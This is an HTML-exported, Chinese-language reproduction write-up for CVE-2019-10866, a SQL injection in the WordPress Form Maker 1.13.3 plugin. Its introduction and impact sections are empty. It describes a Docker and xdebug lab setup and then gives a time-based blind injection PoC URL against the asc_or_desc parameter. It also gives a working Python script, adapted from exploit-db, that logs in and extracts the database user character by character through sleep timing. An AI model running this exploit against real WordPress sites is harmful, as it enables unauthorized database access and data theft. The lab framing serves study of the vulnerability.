<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xecdd01e6813ea78cec03b178e45a4a9facb96e0"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE- 2019-10866</span><span class="csECDA2D3">）</span><span class="csDE05BCC">WordPress Plugin - Form Maker 1.13.3 sql</span><span class="csECDA2D3">注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境搭建"><span class="csD6CA00D2">环境搭建</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">运行环境很简单，只是在</span><span class="cs8926E06">vulapps</span><span class="cs9C1B1871">的基础环境的上加了</span><span class="cs8926E06">xdebug</span><span class="cs9C1B1871">调试插件，把</span><span class="cs8926E06">docker</span><span class="cs9C1B1871">容器作为远程服务器来进行调试。</span><span class="cs8926E06"> Dockerfile</span><span class="cs9C1B1871">文件</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">FROM medicean/vulapps:base_lamp_php7</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">RUN pecl install xdebug</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">COPY php.ini /etc/php/7.0/apache2/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">COPY php.ini /etc/php/7.0/cli/</span></p><p class="cs40DD2BC9"><span class="cs8926E06">docker-compose</span><span class="cs9C1B1871">文件</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">version: &#39;3&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">services:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;lamp-php7:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;build: .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ports:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &quot;80:80&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;volumes:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &quot;/Users/mengchen/Security/Code Audit/html:/var/www/html&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &quot;/Users/mengchen/Security/Code Audit/tmp:/tmp&quot;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">php.ini</span><span class="cs9C1B1871">中</span><span class="cs8926E06">xdebug</span><span class="cs9C1B1871">的配置</span></p><p class="cs3A447A38"><span class="cs9FB05234">[xdebug]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">zend_extension=&quot;/usr/lib/php/20151012/xdebug.so&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xdebug.remote_enable=1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xdebug.remote_host=10.254.254.254</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xdebug.remote_port=9000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xdebug.remote_connect_back=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xdebug.profiler_enable=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xdebug.idekey=PHPSTORM</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xdebug.remote_log=&quot;/tmp/xdebug.log&quot;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为我是在</span><span class="cs8926E06">Mac</span><span class="cs9C1B1871">上，所以要给本机加一个</span><span class="cs8926E06">IP</span><span class="cs9C1B1871">地址，让</span><span class="cs8926E06">xdebug</span><span class="cs9C1B1871">能够连接</span></p><p class="cs3A447A38"><span class="cs9FB05234">sudo ifconfig lo0 alias 10.254.254.254</span></p><p class="cs40DD2BC9"><span class="cs8926E06">PHPStorm</span><span class="cs9C1B1871">也要配置好相对路径</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/%ef%bc%88CVE-%202019-10866%ef%bc%89WordPress%20Plugin%20-%20Form%20Maker%201.13.3%20sql%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="245" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">插件下载地址</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://downloads.wordpress.org/plugin/form-maker.1.13.3.zip</span></p><p class="cs40DD2BC9"><span class="cs8926E06">WordPress</span><span class="cs9C1B1871">使用最新版就可以，在这里我使用的版本是</span><span class="cs8926E06">5.2.2</span><span class="cs9C1B1871">，语言选的简体中文。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">PS: WordPress</span><span class="cs9C1B1871">搭建完毕后，记得关闭自动更新。</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">POC</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-admin/admin.php?page=submissions_fm&amp;task=display&amp;current_id=2&amp;order_by=group_id&amp;asc_or_desc=,(case+when+(select+ascii(substring(user(),1,1)))%3d114+then+(select+sleep(5)+from+wp_users+limit+1)+else+2+end)+asc%3b</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Python</span><span class="cs9C1B1871">脚本，修改自</span><span class="cs8926E06">exploit-db</span></p><p class="cs3A447A38"><span class="cs9FB05234">#coding:utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">vul_url = &quot;http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&amp;task=display&amp;current_id=2&amp;order_by=group_id&amp;asc_or_desc=&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">S = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">S.headers.update({&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,en;q=0.8,zh;q=0.5,en-US;q=0.3&quot;, &quot;Referer&quot;: &quot;http://127.0.0.1/wp-login.php?loggedout=true&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">length = 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">TIME = 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">username = &quot;admin&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">password = &quot;admin&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def login(username, password):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;log&quot;: &quot;admin&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;pwd&quot;: &quot;admin&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;wp-submit&quot;: &quot;\xe7\x99\xbb\xe5\xbd\x95&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;redirect_to&quot;: &quot;http://127.0.0.1/wp-admin/&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;testcookie&quot;: &quot;1&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = S.post(&#39;http://127.0.0.1/wp-login.php&#39;, data=data, cookies = {&quot;wordpress_test_cookie&quot;: &quot;WP+Cookie+check&quot;})</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def attack():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;flag = True</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;length = 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while flag:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag = False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_ascii = 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for ascii in range(32, 127):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_ascii = ascii</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;start_time = time.time()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = &quot;{vul_url},(case+when+(select+ascii(substring(user(),{length},1)))%3d{ascii}+then+(select+sleep({TIME})+from+wp_users+limit+1)+else+2+end)+asc%3b&quot;.format(vul_url=vul_url, ascii=ascii, TIME=TIME, length=length)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print(payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = S.get(payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp = time.time() - start_time</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if tmp &gt;= TIME:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag = True</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if flag:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data += chr(tmp_ascii)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;length += 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">login(username, password)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">attack()</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
</html>
